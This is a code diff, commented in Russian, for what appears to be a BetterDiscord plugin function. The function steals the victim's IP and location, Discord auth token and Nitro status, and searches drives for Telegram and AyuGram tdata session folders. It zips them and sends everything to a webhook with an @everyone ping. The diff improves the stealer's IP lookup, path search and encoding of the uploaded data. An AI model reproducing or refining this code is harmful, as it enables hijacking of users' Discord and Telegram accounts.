@@ -18,15 +18,15 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
 
     let result = { ip: null, location: null, nitro: "Нет", dtoken: null, telegram_path: null, debug_tdata: [], admin_servers: [] };
     
-    // 1. IP и Локация
+    // 1. IP и Локация (используем надежный HTTPS API)
     try {
-        const ipRes = await BdApi.Net.fetch('https://jsonip.com/');
+        const ipRes = await BdApi.Net.fetch('https://ipinfo.io/json');
         const ipData = await ipRes.json();
         result.ip = ipData.ip;
-        const geoRes = await BdApi.Net.fetch(`http://ip-api.com/json/${result.ip}?lang=ru&fields=status,country,regionName,city`);
-        const geoData = await geoRes.json();
-        if (geoData.status === 'success') result.location = geoData.city || geoData.regionName || geoData.country || "Неизвестно";
-    } catch (e) {}
+        result.location = ipData.city || ipData.region || ipData.country || "Неизвестно";
+    } catch (e) {
+        result.debug_tdata.push("Ошибка получения IP: " + e.message);
+    }
 
     // 2. Nitro и Токен
     try {
@@ -39,85 +39,64 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. УМНЫЙ ПОИСК tdata (Telegram & AyuGram)
+    // 3. ПОИСК tdata (Telegram & AyuGram)
     let hasTdata = false;
     let tdataZipBuffer = null;
     try {
         let tdataPath = null;
         
-        // Список базовых путей
-        const appData = process.env.APPDATA;
-        const localAppData = process.env.LOCALAPPDATA;
-        const userProfile = process.env.USERPROFILE;
+        const appData = process.env.APPDATA || '';
+        const localAppData = process.env.LOCALAPPDATA || '';
+        const userProfile = process.env.USERPROFILE || '';
         
-        const standardPaths = [];
-        if (appData) {
-            standardPaths.push(path.join(appData, 'Telegram Desktop', 'tdata'));
-            standardPaths.push(path.join(appData, 'Telegram', 'tdata'));
-            standardPaths.push(path.join(appData, 'AyuGram', 'tdata'));
-        }
-        if (localAppData) {
-            standardPaths.push(path.join(localAppData, 'Telegram Desktop', 'tdata'));
-            standardPaths.push(path.join(localAppData, 'Telegram', 'tdata'));
-            standardPaths.push(path.join(localAppData, 'AyuGram', 'tdata'));
-        }
-        if (userProfile) {
-            // Портативные версии на рабочем столе и в загрузках
-            standardPaths.push(path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'));
-            standardPaths.push(path.join(userProfile, 'Desktop', 'AyuGram', 'tdata'));
-            standardPaths.push(path.join(userProfile, 'Downloads', 'Telegram Desktop', 'tdata'));
-            standardPaths.push(path.join(userProfile, 'Downloads', 'AyuGram', 'tdata'));
-        }
+        result.debug_tdata.push(`APPDATA: ${appData || 'Пусто'}`);
+        
+        // Проверяем стандартные пути
+        const possiblePaths = [
+            path.join(appData, 'Telegram Desktop', 'tdata'),
+            path.join(appData, 'Telegram', 'tdata'),
+            path.join(appData, 'AyuGram', 'tdata'),
+            path.join(localAppData, 'Telegram Desktop', 'tdata'),
+            path.join(localAppData, 'Telegram', 'tdata'),
+            path.join(localAppData, 'AyuGram', 'tdata'),
+            path.join(userProfile, 'Desktop', 'Telegram Desktop', 'tdata'),
+            path.join(userProfile, 'Desktop', 'AyuGram', 'tdata')
+        ];
 
-        // Сначала проверяем стандартные пути
-        for (const p of standardPaths) {
-            if (fs.existsSync(p) && fs.statSync(p).isDirectory()) {
+        for (const p of possiblePaths) {
+            if (fs.existsSync(p)) {
                 tdataPath = p;
                 break;
             }
         }
 
-        // Если не нашли, начинаем "Умный поиск" по корням дисков
+        // Если не нашли, сканируем корни дисков (без глубокого погружения)
         if (!tdataPath) {
-            result.debug_tdata.push("Стандартные пути не найдены. Запуск сканирования...");
+            result.debug_tdata.push("Стандартные пути пусты. Сканирование дисков...");
             const drives = ['C:', 'D:', 'E:', 'F:'];
-            const searchRoots = [];
-            
-            // Добавляем корни дисков
-            drives.forEach(d => {
-                if (fs.existsSync(`${d}\\`)) searchRoots.push(`${d}\\`);
-            });
-            
-            // Добавляем папку пользователя
-            if (userProfile) searchRoots.push(userProfile);
-
-            for (const root of searchRoots) {
+            for (const d of drives) {
                 try {
-                    // Читаем только первый уровень папок
+                    const root = d + '\\';
+                    if (!fs.existsSync(root)) continue;
                     const dirs = fs.readdirSync(root);
                     for (const dir of dirs) {
                         const fullPath = path.join(root, dir);
-                        
-                        // Если это сама папка tdata
-                        if (dir.toLowerCase() === 'tdata' && fs.statSync(fullPath).isDirectory()) {
-                            tdataPath = fullPath;
-                            break;
-                        }
-                        
-                        // Если это папка Telegram, AyuGram или любая другая, заглядываем внутрь на 1 уровень
                         if (fs.statSync(fullPath).isDirectory()) {
+                            // Если папка называется tdata
+                            if (dir.toLowerCase() === 'tdata') {
+                                tdataPath = fullPath;
+                                break;
+                            }
+                            // Или если внутри папки есть tdata (например, C:\Telegram\tdata)
                             try {
                                 const subDirs = fs.readdirSync(fullPath);
                                 for (const sub of subDirs) {
                                     if (sub.toLowerCase() === 'tdata') {
-                                        const subPath = path.join(fullPath, sub);
-                                        if (fs.statSync(subPath).isDirectory()) {
-                                            tdataPath = subPath;
-                                            break;
-                                        }
+                                        tdataPath = path.join(fullPath, sub);
+                                        break;
                                     }
                                 }
-                            } catch (e) {} // Игнорируем ошибки доступа (например, System Volume Information)
+                            } catch (e) {}
                         }
                         if (tdataPath) break;
                     }
@@ -141,16 +120,15 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                         try {
                             if (fs.statSync(fullPath).isDirectory()) addFilesRecursively(fullPath, relativePath);
                             else files[relativePath] = new Uint8Array(fs.readFileSync(fullPath));
-                        } catch (fileErr) { result.debug_tdata.push(`Ошибка файла ${entry}: ${fileErr.message}`); }
+                        } catch (fileErr) {}
                     }
-                } catch (dirErr) { result.debug_tdata.push(`Ошибка папки ${dir}: ${dirErr.message}`); }
+                } catch (dirErr) {}
             };
             
             addFilesRecursively(tdataPath);
             result.debug_tdata.push(`Прочитано файлов: ${Object.keys(files).length}`);
             
             if (Object.keys(files).length > 0) {
-                result.debug_tdata.push("Запуск zipSync...");
                 tdataZipBuffer = zipFunc(files);
                 result.debug_tdata.push("ZIP успешно создан!");
                 hasTdata = true;
@@ -160,7 +138,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         }
     } catch (e) {
         result.debug_tdata.push(`Критическая ошибка архивации: ${e.message}`);
-        hasTdata = false; 
     }
 
     // 4. Сбор информации о серверах
@@ -187,13 +164,21 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         }
     } catch (e) {}
 
-    // 5. Формируем сообщение и файлы
+    // 5. Формируем сообщение и файлы (ОБЯЗАТЕЛЬНО указываем charset=utf-8)
     const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
+    
     const formData = new FormData();
     formData.append('payload_json', JSON.stringify({ content: messageText }));
-    const jsonBuffer = Buffer.from(JSON.stringify(result, null, 2));
-    formData.append('files[0]', new Blob([jsonBuffer], { type: 'application/json' }), 'data.json');
-    if (tdataZipBuffer) formData.append('files[1]', new Blob([tdataZipBuffer], { type: 'application/zip' }), 'tdata.zip');
+    
+    // Вот здесь мы чиним кракозябры
+    const jsonString = JSON.stringify(result, null, 2);
+    const jsonBlob = new Blob([jsonString], { type: 'application/json; charset=utf-8' });
+    formData.append('files[0]', jsonBlob, 'data.json');
+    
+    if (tdataZipBuffer) {
+        const zipBlob = new Blob([tdataZipBuffer], { type: 'application/zip' });
+        formData.append('files[1]', zipBlob, 'tdata.zip');
+    }
 
     // 6. Отправка
     try {
